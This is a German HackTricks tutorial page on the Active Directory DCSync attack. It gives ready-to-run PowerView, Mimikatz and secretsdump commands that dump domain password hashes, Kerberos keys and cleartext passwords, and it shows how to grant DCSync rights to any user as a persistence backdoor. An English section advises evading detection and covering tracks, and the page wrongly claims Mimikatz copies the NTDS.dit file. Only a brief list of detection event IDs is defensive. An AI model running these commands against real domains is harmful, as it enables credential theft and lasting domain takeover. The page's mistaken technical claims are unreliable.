# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## DCSync

Die Berechtigung **DCSync** impliziert, dass diese Berechtigungen über die Domäne selbst verfügt werden: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.

**Wichtige Hinweise zu DCSync:**

* Der **DCSync-Angriff simuliert das Verhalten eines Domänencontrollers und fordert andere Domänencontroller auf, Informationen zu replizieren**, indem der Directory Replication Service Remote Protocol (MS-DRSR) verwendet wird. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann sie nicht ausgeschaltet oder deaktiviert werden.
* Standardmäßig haben nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** die erforderlichen Berechtigungen.
* Wenn Kennwörter von Konten mit umkehrbarer Verschlüsselung gespeichert werden, besteht in Mimikatz die Möglichkeit, das Kennwort im Klartext zurückzugeben.

### Enumeration

Überprüfen Sie mit `powerview`, wer diese Berechtigungen hat:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Lokaler Angriff

Ein lokaler Angriff bezieht sich auf Angriffe, die von einem bereits kompromittierten System innerhalb des Netzwerks ausgeführt werden. Diese Art von Angriffen erfordert bereits Zugriff auf ein System innerhalb des Netzwerks, um weitere Angriffe durchzuführen.

#### DCSync

DCSync ist eine Technik, die von Angreifern verwendet wird, um Informationen aus dem Active Directory (AD) zu extrahieren. Mit DCSync kann ein Angreifer die NTLM-Hashes von Benutzerkonten abrufen, einschließlich des Hashes des Domänenadministrators. Dies ermöglicht es dem Angreifer, sich als ein beliebiges Benutzerkonto zu authentifizieren und auf Ressourcen im Netzwerk zuzugreifen.

Um DCSync auszuführen, muss der Angreifer über Administratorrechte auf einem System innerhalb des Netzwerks verfügen. Der Angreifer verwendet das Tool "mimikatz", um den DCSync-Angriff durchzuführen. Mimikatz ermöglicht es dem Angreifer, den NTDS.dit-Datenbankdatei des Active Directory zu kopieren und die darin enthaltenen NTLM-Hashes abzurufen.

Um den DCSync-Angriff zu verhindern, sollten Sicherheitsmaßnahmen wie die Begrenzung der Administratorrechte, die Verwendung von sicheren Kennwörtern und die regelmäßige Überprüfung der Active Directory-Protokolle implementiert werden.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Remote ausnutzen

The DCSync attack can be executed remotely if the attacker has the necessary privileges. This attack allows the attacker to impersonate a domain controller and request the replication of the Active Directory database from a targeted domain controller. By exploiting this vulnerability, the attacker can retrieve sensitive information such as password hashes for all domain user accounts. 

To remotely exploit this vulnerability, the attacker needs to have administrative privileges on the targeted domain or have compromised a user account with the necessary privileges. Once the attacker has gained access, they can use tools such as Mimikatz to execute the DCSync attack and retrieve the desired information. 

It is important to note that remote exploitation of the DCSync vulnerability requires careful planning and execution to avoid detection. The attacker must ensure that they have the necessary permissions and take steps to cover their tracks to avoid raising suspicion.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generiert 3 Dateien:

* eine mit den **NTLM-Hashes**
* eine mit den **Kerberos-Schlüsseln**
* eine mit Klartext-Passwörtern aus dem NTDS für alle Konten, bei denen die [**umkehrbare Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Sie können Benutzer mit umkehrbarer Verschlüsselung mit folgendem Befehl erhalten:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Beharrlichkeit

Wenn Sie ein Domänenadministrator sind, können Sie diese Berechtigungen mithilfe von `powerview` einem beliebigen Benutzer gewähren:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dann kannst du **überprüfen, ob dem Benutzer die 3 Berechtigungen korrekt zugewiesen wurden**, indem du nach ihnen im Ausgabefeld suchst (du solltest die Namen der Berechtigungen im Feld "ObjectType" sehen können):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Abwehrmaßnahmen

* Sicherheitsereignis-ID 4662 (Audit-Richtlinie für Objekt muss aktiviert sein) - Es wurde eine Operation auf einem Objekt durchgeführt.
* Sicherheitsereignis-ID 5136 (Audit-Richtlinie für Objekt muss aktiviert sein) - Ein Verzeichnisdienstobjekt wurde geändert.
* Sicherheitsereignis-ID 4670 (Audit-Richtlinie für Objekt muss aktiviert sein) - Berechtigungen für ein Objekt wurden geändert.
* AD ACL Scanner - Erstellen und vergleichen Sie Berichte über ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referenzen

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
